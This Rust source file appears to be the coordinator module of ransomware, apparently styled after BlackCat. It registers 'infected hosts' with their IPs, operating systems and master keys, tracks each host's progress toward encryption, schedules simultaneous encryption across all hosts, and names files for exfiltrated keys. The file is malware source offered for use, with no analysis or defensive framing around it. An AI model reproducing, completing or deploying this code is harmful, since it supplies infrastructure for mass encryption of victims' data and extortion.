// src/coordinator.rs
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};
use chrono::{DateTime, Utc};
use serde::{Serialize, Deserialize};
use log::{info, warn, error};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InfectedHost {
    pub ip: String,
    pub os: String,
    pub infected_at: u64,
    pub master_key: String,
    pub status: HostStatus,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum HostStatus {
    Infected,
    ReadyToEncrypt,
    Encrypting,
    Encrypted,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptionCommand {
    pub timestamp: u64,  // Когда начать шифрование (UNIX timestamp)
    pub master_key: String,
    pub sync_id: String,
}

pub struct Coordinator {
    infected_hosts: Arc<Mutex<HashMap<String, InfectedHost>>>,
    pending_commands: Arc<Mutex<HashMap<String, EncryptionCommand>>>,
}

impl Coordinator {
    pub fn new() -> Self {
        Coordinator {
            infected_hosts: Arc::new(Mutex::new(HashMap::new())),
            pending_commands: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    pub fn register_host(&self, ip: &str, os: &str, master_key: &str) {
        let mut hosts = self.infected_hosts.lock().unwrap();
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        
        hosts.insert(ip.to_string(), InfectedHost {
            ip: ip.to_string(),
            os: os.to_string(),
            infected_at: timestamp,
            master_key: master_key.to_string(),
            status: HostStatus::Infected,
        });
        
        info!("Registered new host: {} ({})", ip, os);
    }

    pub fn update_host_status(&self, ip: &str, status: HostStatus) {
        let mut hosts = self.infected_hosts.lock().unwrap();
        if let Some(host) = hosts.get_mut(ip) {
            host.status = status.clone();
            info!("Host {} status updated to {:?}", ip, status);
        }
    }

    pub fn schedule_sync_encryption(&self, delay_seconds: u64) -> (String, u64) {
        let sync_id = format!("sync_{}", hex::encode(rand::random::<[u8; 8]>()));
        let encryption_time = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs() + delay_seconds;
        
        let command = EncryptionCommand {
            timestamp: encryption_time,
            master_key: String::new(),
            sync_id: sync_id.clone(),
        };
        
        let mut commands = self.pending_commands.lock().unwrap();
        commands.insert(sync_id.clone(), command);
        
        info!("Scheduled synchronized encryption at {} (sync_id: {})", 
            DateTime::<Utc>::from_utc(
                chrono::NaiveDateTime::from_timestamp_opt(encryption_time as i64, 0).unwrap(),
                Utc
            ).format("%Y-%m-%d %H:%M:%S"),
            sync_id
        );
        
        (sync_id, encryption_time)
    }

    pub fn get_encryption_time(&self, sync_id: &str) -> Option<u64> {
        let commands = self.pending_commands.lock().unwrap();
        commands.get(sync_id).map(|cmd| cmd.timestamp)
    }

    pub fn get_all_hosts(&self) -> Vec<InfectedHost> {
        let hosts = self.infected_hosts.lock().unwrap();
        hosts.values().cloned().collect()
    }

    pub fn wait_until_encryption_time(&self, sync_id: &str) {
        loop {
            if let Some(encryption_time) = self.get_encryption_time(sync_id) {
                let now = SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .unwrap()
                    .as_secs();
                
                if now >= encryption_time {
                    info!("Encryption time reached for sync_id: {}", sync_id);
                    break;
                }
                
                let remaining = encryption_time - now;
                if remaining > 60 {
                    std::thread::sleep(std::time::Duration::from_secs(60));
                } else if remaining > 10 {
                    std::thread::sleep(std::time::Duration::from_secs(10));
                } else if remaining > 0 {
                    std::thread::sleep(std::time::Duration::from_secs(1));
                } else {
                    break;
                }
            } else {
                warn!("Sync ID {} not found, starting encryption immediately", sync_id);
                break;
            }
        }
    }

    pub fn generate_exfiltration_filename(&self, master_key: &str) -> String {
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        
        format!("blackcat_exfil_key_{}_{}.enc", &master_key[0..16], timestamp)
    }
}